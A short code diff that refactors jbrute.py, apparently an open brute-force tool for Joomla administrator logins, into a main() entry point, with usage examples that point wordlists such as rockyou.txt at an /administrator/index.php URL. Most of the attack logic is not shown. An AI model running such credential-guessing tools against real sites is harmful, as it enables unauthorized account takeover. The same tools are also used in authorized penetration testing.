@@ -8,7 +8,6 @@ from functools import partial
 from itertools import product
 from argparse import ArgumentParser, RawTextHelpFormatter
 
-
 def login(url: str, login: tuple[str, str]):
     username, password = login
     session = Session()
@@ -31,15 +30,16 @@ def login(url: str, login: tuple[str, str]):
     return (login, response)
 
 
-if __name__ == "__main__":
+
+def main():
     parser = ArgumentParser(
         description="Brute-force login form authentication for Joomla",
         formatter_class=RawTextHelpFormatter,
         epilog="""Examples:           
-    python jbrute.py http://joomla.local/administrator/index.php -u admin -p 123456 -t1
-    python jbrute.py http://joomla.local/administrator/index.php -u admin -P rockyou.txt
-    python jbrute.py http://joomla.local/administrator/index.php -U users.txt -p 123456
-    python jbrute.py http://joomla.local/administrator/index.php -U users.txt -P passwords.txt
+    jbrute http://joomla.local/administrator/index.php -u admin -p 123456 -t1
+    jbrute http://joomla.local/administrator/index.php -u admin -P rockyou.txt
+    jbrute http://joomla.local/administrator/index.php -U users.txt -p 123456
+    jbrute http://joomla.local/administrator/index.php -U users.txt -P passwords.txt
     """,
     )
 
@@ -132,3 +132,6 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
             pass
         pool.terminate()
+
+if __name__ == "__main__":
+    main()
